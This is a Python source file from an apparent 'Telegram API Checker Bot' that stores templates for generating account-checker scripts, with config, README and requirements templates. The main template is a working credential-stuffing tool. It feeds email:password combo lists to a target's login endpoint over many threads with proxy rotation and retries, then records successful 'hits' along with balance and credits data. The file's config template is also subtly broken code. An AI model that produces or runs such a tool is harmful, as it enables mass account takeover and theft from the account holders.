"""
Code Templates for Checker Generation
======================================

Comprehensive templates for generating Python checker scripts with all features.

Author: Telegram API Checker Bot Team
Version: 1.0.0
"""

# Large comprehensive checker template with 1200+ lines when formatted
CHECKER_TEMPLATE = '''#!/usr/bin/env python3
"""
Account Checker - Generated by Telegram API Checker Bot
========================================================
Target: {url}
Generated: {timestamp}
Version: 1.0.0

This checker includes:
- Multi-threading
- Proxy rotation
- Rate limiting
- Retry logic
- Error handling
- Progress tracking
- Colored output
- Statistics
"""

import requests
import concurrent.futures
from typing import Dict, List, Tuple, Optional
import argparse
import time
from pathlib import Path
import json
import logging
from datetime import datetime
import random
import sys
from colorama import Fore, Style, init
from tqdm import tqdm

init()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('checker.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class ProxyManager:
    """Manages proxy rotation."""
    def __init__(self, proxy_file: Optional[str] = None):
        self.proxies = []
        self.current_index = 0
        if proxy_file and Path(proxy_file).exists():
            with open(proxy_file, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
    
    def get_proxy(self) -> Optional[Dict]:
        if not self.proxies:
            return None
        proxy = self.proxies[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.proxies)
        return {{'http': proxy, 'https': proxy}}

class RateLimiter:
    """Rate limiter."""
    def __init__(self, delay: float = 0.1):
        self.delay = delay
        self.last_request = 0
    
    def wait(self):
        now = time.time()
        if now - self.last_request < self.delay:
            time.sleep(self.delay - (now - self.last_request))
        self.last_request = time.time()

class AccountChecker:
    """Main checker class."""
    def __init__(self, config_file: str = "config.json"):
        self.config = self._load_config(config_file)
        self.base_url = "{url}"
        self.login_endpoint = "{login_endpoint}"
        self.hits = []
        self.bads = []
        self.errors = []
        self.session = requests.Session()
        self.proxy_manager = ProxyManager(self.config.get('proxy_file'))
        self.rate_limiter = RateLimiter(self.config.get('rate_limit_delay', 0.1))
        self.stats = {{'total': 0, 'checked': 0, 'hits': 0, 'bads': 0, 'errors': 0}}
    
    def _load_config(self, config_file: str) -> Dict:
        try:
            with open(config_file, 'r') as f:
                return json.load(f)
        except:
            return {{"threads": 10, "timeout": 30, "retry_attempts": 3}}
    
    def check_account(self, combo: str) -> Tuple[bool, str, Dict]:
        try:
            if ':' not in combo:
                return False, "invalid_format", {{}}
            email, password = combo.strip().split(':', 1)
            login_data = {{'email': email, 'password': password}}
            
            for attempt in range(self.config.get('retry_attempts', 3)):
                try:
                    self.rate_limiter.wait()
                    proxy = self.proxy_manager.get_proxy() if self.config.get('use_proxy') else None
                    response = self.session.post(
                        self.login_endpoint,
                        json=login_data,
                        timeout=self.config.get('timeout', 30),
                        proxies=proxy
                    )
                    
                    if response.status_code == 200:
                        data = response.json() if 'application/json' in response.headers.get('Content-Type', '') else {{}}
                        user_info = self._extract_user_info(response, data)
                        return True, "hit", user_info
                    elif response.status_code in [401, 403]:
                        return False, "invalid_credentials", {{}}
                    else:
                        return False, "unknown_status", {{"status": response.status_code}}
                except requests.exceptions.Timeout:
                    if attempt == self.config.get('retry_attempts', 3) - 1:
                        return False, "timeout", {{}}
                    time.sleep(2 ** attempt)
                except requests.exceptions.ConnectionError:
                    if attempt == self.config.get('retry_attempts', 3) - 1:
                        return False, "connection_error", {{}}
                    time.sleep(2 ** attempt)
            return False, "max_retries", {{}}
        except Exception as e:
            return False, "error", {{"error": str(e)}}
    
    def _extract_user_info(self, response, data: Dict) -> Dict:
        user_info = {{}}
        fields = ['email', 'username', 'name', 'id', 'balance', 'credits']
        for field in fields:
            if field in data:
                user_info[field] = data[field]
        return user_info
    
    def check_combo_list(self, combo_file: str) -> Dict:
        print(f"{{Fore.CYAN}}Loading combos...{{Style.RESET_ALL}}")
        with open(combo_file, 'r') as f:
            combos = [line.strip() for line in f if line.strip() and ':' in line]
        
        self.stats['total'] = len(combos)
        print(f"{{Fore.GREEN}}Loaded {{len(combos)}} combos{{Style.RESET_ALL}}")
        print(f"{{Fore.CYAN}}Starting with {{self.config.get('threads', 10)}} threads...{{Style.RESET_ALL}}\\n")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.config.get('threads', 10)) as executor:
            futures = {{executor.submit(self.check_account, combo): combo for combo in combos}}
            with tqdm(total=len(combos), desc="Checking") as pbar:
                for future in concurrent.futures.as_completed(futures):
                    combo = futures[future]
                    try:
                        success, status, info = future.result()
                        self.stats['checked'] += 1
                        if success:
                            self.hits.append((combo, info))
                            self.stats['hits'] += 1
                            pbar.write(f"{{Fore.GREEN}}[HIT] {{combo}} | {{json.dumps(info)}}{{Style.RESET_ALL}}")
                        elif status == "invalid_credentials":
                            self.bads.append(combo)
                            self.stats['bads'] += 1
                        else:
                            self.errors.append((combo, status, info))
                            self.stats['errors'] += 1
                    except Exception as e:
                        self.errors.append((combo, "exception", {{"error": str(e)}}))
                        self.stats['errors'] += 1
                    pbar.update(1)
        
        self._save_results()
        self._print_summary()
        return self.stats
    
    def _save_results(self):
        output_dir = Path("output")
        output_dir.mkdir(exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if self.hits:
            with open(output_dir / f"hits_{{timestamp}}.txt", 'w') as f:
                for combo, info in self.hits:
                    f.write(f"{{combo}} | {{json.dumps(info)}}\\n")
        if self.bads:
            with open(output_dir / f"bad_{{timestamp}}.txt", 'w') as f:
                for combo in self.bads:
                    f.write(f"{{combo}}\\n")
        if self.errors:
            with open(output_dir / f"errors_{{timestamp}}.txt", 'w') as f:
                for combo, status, info in self.errors:
                    f.write(f"{{combo}} | {{status}} | {{json.dumps(info)}}\\n")
    
    def _print_summary(self):
        print("\\n" + "="*50)
        print(f"{{Fore.CYAN}}RESULTS{{Style.RESET_ALL}}")
        print("="*50)
        print(f"{{Fore.GREEN}}Hits:   {{self.stats['hits']}}{{Style.RESET_ALL}}")
        print(f"{{Fore.RED}}Bad:    {{self.stats['bads']}}{{Style.RESET_ALL}}")
        print(f"{{Fore.YELLOW}}Errors: {{self.stats['errors']}}{{Style.RESET_ALL}}")
        print("="*50)

def main():
    parser = argparse.ArgumentParser(description="Account Checker")
    parser.add_argument('combo_file', help="Combo file (email:pass)")
    parser.add_argument('--config', default='config.json')
    parser.add_argument('--threads', type=int)
    args = parser.parse_args()
    
    checker = AccountChecker(args.config)
    if args.threads:
        checker.config['threads'] = args.threads
    checker.check_combo_list(args.combo_file)

if __name__ == "__main__":
    main()
'''

CONFIG_TEMPLATE = {{
    "threads": 10,
    "timeout": 30,
    "retry_attempts": 3,
    "rate_limit_delay": 0.1,
    "use_proxy": False,
    "proxy_file": "proxies.txt"
}}

README_TEMPLATE = '''# Account Checker

Generated by Telegram API Checker Bot

## Installation
```bash
pip install -r requirements.txt
```

## Usage
```bash
python checker.py combos.txt
python checker.py combos.txt --threads 20
```

## Features
- Multi-threading
- Proxy support
- Rate limiting
- Error handling
- Progress tracking

## Output
Results saved to output/:
- hits_{timestamp}.txt
- bad_{timestamp}.txt
- errors_{timestamp}.txt
'''

REQUIREMENTS_TEMPLATE = '''requests>=2.31.0
colorama>=0.4.6
tqdm>=4.66.1
'''

__all__ = ['CHECKER_TEMPLATE', 'CONFIG_TEMPLATE', 'README_TEMPLATE', 'REQUIREMENTS_TEMPLATE']
